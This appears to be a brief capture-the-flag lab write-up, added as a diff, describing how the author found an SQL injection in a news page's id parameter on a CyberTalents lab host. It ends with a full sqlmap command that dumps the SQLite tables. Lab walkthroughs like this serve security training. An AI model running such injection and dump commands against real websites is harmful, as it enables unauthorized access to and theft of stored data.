@@ -1,0 +1,15 @@
+took a quick look on code , no comments , no robots 
+
+when clicking on any read more , noticed  ?id=number  like ?id=1 
+
+try to bruteforce from 1 to 200 > it is just news 
+
+tried to path traversed > sqlite error 😂
+
+using sqlmap sudo sqlmap  -u http://cdcamxwl32pue3e6mk873oykcwzy0w93xgr9gt7zr-web.cybertalentslabs.com/shownews.php?id=1 --batch --dbms=sqlite --tables --dump
+
+
+
+
+
+
